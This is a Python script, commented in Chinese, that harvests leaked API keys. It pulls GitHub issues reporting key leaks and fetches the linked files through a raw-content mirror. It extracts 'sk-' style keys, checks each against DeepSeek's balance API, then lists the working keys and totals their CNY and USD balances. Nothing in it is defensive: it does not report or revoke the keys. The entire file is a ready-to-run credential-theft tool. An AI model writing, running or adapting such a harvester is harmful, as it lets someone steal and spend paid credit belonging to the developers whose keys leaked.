apitoken=""#想什么呢，以为我会忘删apikey?


if apitoken:
  headers={
  'Authorization': f"Bearer {apitoken}",
  'Accept': 'application/json'
  }
else:
  headers={
  'Accept': 'application/json'
  }
import re
import requests
import json
cny总额=0
usd总额=0
有效key列表=list()
搜索结果=requests.get("https://api.github.com/search/issues?q=your key leak author:chinese-leak-key-check&sort=created&order=desc",headers=headers).json()["items"]
for 目标issue in 搜索结果:
  try:
    目标issue=目标issue["url"]
    目标body=requests.get(目标issue,headers=headers).json()["body"]
    目标文件=re.sub(r"https?://github\.com","https://raw.keccak.top",re.search(r"https?://github\.com.*",目标body).group()).replace("/blob","")
    文件内容=requests.get(目标文件).text
    匹配的key=re.findall("(sk-([^\"'\\n]\\w)*)",文件内容)
    keys=list()

    for i in 匹配的key:
      keys.append(i[0])
    for i in keys:
      try:
        res=requests.get("https://api.deepseek.com/user/balance",headers={'Accept': 'application/json','Authorization': f"Bearer {i}"}).json()
        if not res["is_available"]:
          print("没钱居然")
        else:
          有效key列表.append(i)
          for ii in res["balance_infos"]:
            print(f"有{str(ii["total_balance"])}{ii["currency"]}")
            if ii["currency"]=="CNY":
              cny总额=round(cny总额+float(ii["total_balance"]),2)
            else:
              usd总额=round(usd总额+float(ii["total_balance"]),2)
      except:
        print("此key无效，下一个")
  except:
    print("此结果异常，下一个")
print(f"cny总额:{cny总额}")
print(f"usd总额:{usd总额}")
print("有效key列表:")
for i in 有效key列表:
  print(i)